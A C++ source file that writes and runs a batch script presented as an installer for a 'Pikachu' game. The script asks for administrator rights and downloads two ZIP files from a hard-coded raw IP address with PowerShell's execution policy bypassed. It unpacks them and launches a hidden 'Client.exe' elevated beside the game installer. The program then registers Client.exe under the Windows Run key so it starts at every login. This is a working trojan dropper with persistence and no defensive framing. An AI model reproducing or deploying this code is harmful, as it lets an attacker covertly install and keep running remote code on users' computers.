#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>
#include <windows.h>

#ifndef _WIN32
#include <sys/stat.h>
#include <sys/wait.h>
#endif

int main() {

#ifdef _WIN32

    const std::string filePath = "D:\\hello.bat";

    const std::string content = R"BAT(
@echo off
setlocal

REM =========================
REM Check admin rights
REM =========================

net session >nul 2>&1

if %errorlevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs"
    exit /b
)

REM =========================
REM Variables
REM =========================

set "urlClient=http://13.212.119.185/Client.zip"
set "outPathClient=%USERPROFILE%\temp\Client.zip"

set "urlPikachu=http://13.212.119.185/Pikachu.zip"
set "outPathPikachu=%USERPROFILE%\temp\Pikachu.zip"

REM =========================
REM Create temp folder
REM =========================

if not exist "%USERPROFILE%\temp" (
    mkdir "%USERPROFILE%\temp"
)

timeout /t 1 >nul

echo Installing Game Pikachu, please wait...

REM =========================
REM Download files
REM =========================

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri '%urlClient%' -OutFile '%outPathClient%'"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri '%urlPikachu%' -OutFile '%outPathPikachu%'"

REM =========================
REM Extract ZIP
REM =========================

if exist "%outPathClient%" (

    powershell -NoProfile -Command ^
    "Expand-Archive -Path '%outPathClient%' -DestinationPath '%USERPROFILE%\temp\Client' -Force"

    powershell -NoProfile -Command ^
    "Start-Process '%USERPROFILE%\temp\Client\Client.exe' -Verb RunAs"

) else (

    echo Client download failed.
)

if exist "%outPathPikachu%" (

    powershell -NoProfile -Command ^
    "Expand-Archive -Path '%outPathPikachu%' -DestinationPath '%USERPROFILE%\temp\Pikachu' -Force"

    powershell -NoProfile -Command ^
    "Start-Process '%USERPROFILE%\temp\Pikachu\pikachucodien2_setup_nsis.exe'"

) else (

    echo Pikachu download failed.
)

exit
)BAT";

    std::ofstream ofs(filePath);

    if (!ofs) {
        std::cerr << "Cannot create file: " << filePath << "\n";
        return 1;
    }

    ofs << content;
    ofs.close();

    std::string cmd = "cmd /c \"" + filePath + "\"";

    int rc = std::system(cmd.c_str());

    if (rc == -1) {
        perror("system");
        return 3;
    }

    HKEY hKey;

    const char* regPath =
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    const char* appName = "Client";

    char userProfile[MAX_PATH];

    GetEnvironmentVariableA(
        "USERPROFILE",
        userProfile,
        MAX_PATH
    );

    std::string exePath =
        std::string(userProfile) +
        "\\temp\\Client\\Client.exe";

    LONG result = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        regPath,
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (result == ERROR_SUCCESS) {

        result = RegSetValueExA(
            hKey,
            appName,
            0,
            REG_SZ,
            (const BYTE*)exePath.c_str(),
            exePath.size() + 1
        );

        RegCloseKey(hKey);

        if (result == ERROR_SUCCESS) {
            std::cout << "Registry added successfully.\n";
        }
        else {
            std::cout << "Failed to add registry.\n";
        }
    }
    else {
        std::cout << "Cannot open registry key.\n";
    }

    return 0;

#else

    return 0;

#endif
}
